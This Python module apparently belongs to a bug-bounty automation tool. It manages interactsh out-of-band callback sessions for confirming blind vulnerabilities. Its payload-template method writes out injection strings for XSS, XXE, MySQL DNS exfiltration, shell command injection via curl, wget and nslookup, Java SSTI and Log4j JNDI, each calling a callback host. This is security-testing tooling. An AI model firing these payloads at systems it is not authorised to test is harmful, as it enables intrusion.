"""Interactsh Client - Out-of-band callback infrastructure for Project Triage v4.

Provides public OOB callback URLs for confirming blind vulnerabilities:
- Blind SSRF (server fetches our URL = confirmed)
- Blind XSS (browser loads our URL = confirmed)
- Blind XXE (XML parser fetches our DTD = confirmed)
- Blind SQLi (DNS exfiltration via our domain = confirmed)
- Blind command injection (curl/wget to our URL = confirmed)

Without public OOB callbacks, these entire vulnerability classes produce
zero evidence and get rejected as "theoretical" by triagers.

Uses interactsh (projectdiscovery) or falls back to a simple DNS/HTTP check.

Research basis: Gap analysis GAP-2, NahamSec methodology, nuclei integration.
"""

from __future__ import annotations

import json
import logging
import os
import re
import time
from dataclasses import dataclass, field
from typing import Any

from utils.utils import run_cmd

log = logging.getLogger(__name__)


@dataclass
class Interaction:
    """A received OOB interaction (callback hit)."""
    protocol: str  # dns, http, smtp, ftp
    source_ip: str
    timestamp: float
    raw_request: str
    unique_id: str  # The subdomain/path that was hit
    finding_context: str = ""  # Which hypothesis triggered this


@dataclass
class OOBSession:
    """An active OOB callback session."""
    session_id: str
    base_domain: str  # e.g., abc123.oast.fun
    correlation_ids: dict[str, str] = field(default_factory=dict)  # hypothesis_id -> subdomain
    interactions: list[Interaction] = field(default_factory=list)
    active: bool = True


class InteractshClient:
    """Manages OOB callback infrastructure via interactsh.

    Generates unique callback URLs per hypothesis, polls for interactions,
    and correlates received callbacks with the hypothesis that triggered them.
    """

    def __init__(self, server: str = "oast.fun") -> None:
        self._server = server
        self._session: OOBSession | None = None
        self._poll_interval = 10  # seconds
        self._counter = 0

    def start_session(self) -> OOBSession | None:
        """Start a new interactsh session.

        Tries to use interactsh-client binary first, falls back to
        a simple unique subdomain approach.
        """
        # Try interactsh-client binary
        try:
            result = run_cmd("interactsh-client -v 2>/dev/null | head -1")
            if "interactsh" in result.lower():
                return self._start_interactsh_session()
        except Exception:
            pass

        # Fallback: generate a pseudo-unique domain
        # This won't actually receive callbacks without the interactsh server
        # but allows the infrastructure to be in place
        import hashlib
        session_id = hashlib.sha256(
            f"{time.time()}:{os.getpid()}".encode()
        ).hexdigest()[:12]

        self._session = OOBSession(
            session_id=session_id,
            base_domain=f"{session_id}.{self._server}",
        )
        log.info("OOB session started (fallback mode): %s", self._session.base_domain)
        return self._session

    def _start_interactsh_session(self) -> OOBSession | None:
        """Start a real interactsh session using the CLI client."""
        try:
            # Register with interactsh server
            result = run_cmd(
                f"interactsh-client -s {self._server} -n 1 -json 2>/dev/null"
            )
            if result:
                lines = result.strip().split("\n")
                for line in lines:
                    if "." in line and self._server in line:
                        domain = line.strip()
                        session_id = domain.split(".")[0]
                        self._session = OOBSession(
                            session_id=session_id,
                            base_domain=domain,
                        )
                        log.info("Interactsh session started: %s", domain)
                        return self._session
        except Exception as e:
            log.warning("Interactsh client failed: %s", e)
        return None

    def get_callback_url(self, hypothesis_id: str, protocol: str = "http") -> str:
        """Generate a unique callback URL for a specific hypothesis.

        Each hypothesis gets its own subdomain so we can correlate
        which callback corresponds to which test.
        """
        if not self._session:
            self.start_session()
        if not self._session:
            return ""

        self._counter += 1
        # Create a unique subdomain per hypothesis
        unique_sub = f"h{self._counter:04d}"
        full_domain = f"{unique_sub}.{self._session.base_domain}"

        # Store correlation
        self._session.correlation_ids[hypothesis_id] = unique_sub

        if protocol == "dns":
            return full_domain
        elif protocol == "https":
            return f"https://{full_domain}"
        else:
            return f"http://{full_domain}"

    def get_dns_callback(self, hypothesis_id: str) -> str:
        """Get a DNS-only callback domain (for DNS exfil, blind XXE)."""
        return self.get_callback_url(hypothesis_id, protocol="dns")

    def get_http_callback(self, hypothesis_id: str) -> str:
        """Get an HTTP callback URL (for blind SSRF, blind XSS)."""
        return self.get_callback_url(hypothesis_id, protocol="http")

    def poll_interactions(self) -> list[Interaction]:
        """Poll for new OOB interactions.

        Returns list of new interactions since last poll.
        """
        if not self._session:
            return []

        new_interactions: list[Interaction] = []

        # Try interactsh-client poll
        try:
            result = run_cmd(
                f"interactsh-client -s {self._server} "
                f"-sf {self._session.session_id} -json -poll 2>/dev/null"
            )
            if result:
                for line in result.strip().split("\n"):
                    if not line.strip():
                        continue
                    try:
                        data = json.loads(line)
                        interaction = Interaction(
                            protocol=data.get("protocol", "unknown"),
                            source_ip=data.get("remote-address", ""),
                            timestamp=time.time(),
                            raw_request=data.get("raw-request", "")[:500],
                            unique_id=data.get("unique-id", ""),
                        )

                        # Correlate with hypothesis
                        for hyp_id, sub in self._session.correlation_ids.items():
                            if sub in interaction.unique_id:
                                interaction.finding_context = hyp_id
                                break

                        new_interactions.append(interaction)
                        self._session.interactions.append(interaction)
                    except json.JSONDecodeError:
                        continue
        except Exception as e:
            log.debug("Poll failed: %s", e)

        return new_interactions

    def check_for_hypothesis(self, hypothesis_id: str) -> list[Interaction]:
        """Check if any callbacks were received for a specific hypothesis."""
        if not self._session:
            return []

        sub = self._session.correlation_ids.get(hypothesis_id, "")
        if not sub:
            return []

        return [
            i for i in self._session.interactions
            if sub in i.unique_id or i.finding_context == hypothesis_id
        ]

    def has_callback(self, hypothesis_id: str) -> bool:
        """Quick check: did we receive any callback for this hypothesis?"""
        return len(self.check_for_hypothesis(hypothesis_id)) > 0

    def get_payload_templates(self, hypothesis_id: str) -> dict[str, str]:
        """Get OOB payload templates for different vulnerability classes.

        Returns a dict of payload strings with the callback URL embedded.
        """
        http_url = self.get_http_callback(hypothesis_id)
        dns_domain = self.get_dns_callback(hypothesis_id)

        return {
            "ssrf_basic": http_url,
            "ssrf_gopher": f"gopher://{dns_domain}:80/_GET%20/%20HTTP/1.0%0d%0a%0d%0a",
            "blind_xss": f'"><img src={http_url}>',
            "blind_xss_script": f'"><script src={http_url}></script>',
            "xxe_dtd": (
                f'<?xml version="1.0"?><!DOCTYPE foo ['
                f'<!ENTITY xxe SYSTEM "{http_url}">]>'
                f'<foo>&xxe;</foo>'
            ),
            "xxe_oob": (
                f'<?xml version="1.0"?><!DOCTYPE foo ['
                f'<!ENTITY % xxe SYSTEM "{http_url}/xxe.dtd">'
                f'%xxe;]><foo>test</foo>'
            ),
            "blind_sqli_dns": f"'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',({dns_domain}),'\\\\\\\\a'));--",
            "blind_cmdi_curl": f"; curl {http_url}/cmdi",
            "blind_cmdi_wget": f"; wget {http_url}/cmdi -O /dev/null",
            "blind_cmdi_dns": f"; nslookup {dns_domain}",
            "ssti_oob": f"${{T(java.lang.Runtime).getRuntime().exec('curl {http_url}/ssti')}}",
            "log4j": f"${{jndi:ldap://{dns_domain}/a}}",
        }

    def stop_session(self) -> None:
        """Stop the OOB session."""
        if self._session:
            self._session.active = False
            log.info(
                "OOB session stopped. Total interactions: %d",
                len(self._session.interactions),
            )

    @property
    def stats(self) -> dict[str, Any]:
        """Return OOB session statistics."""
        if not self._session:
            return {"active": False}
        return {
            "active": self._session.active,
            "base_domain": self._session.base_domain,
            "correlation_count": len(self._session.correlation_ids),
            "total_interactions": len(self._session.interactions),
            "interactions_by_protocol": {
                proto: sum(1 for i in self._session.interactions if i.protocol == proto)
                for proto in {"dns", "http", "smtp", "ftp"}
            },
        }
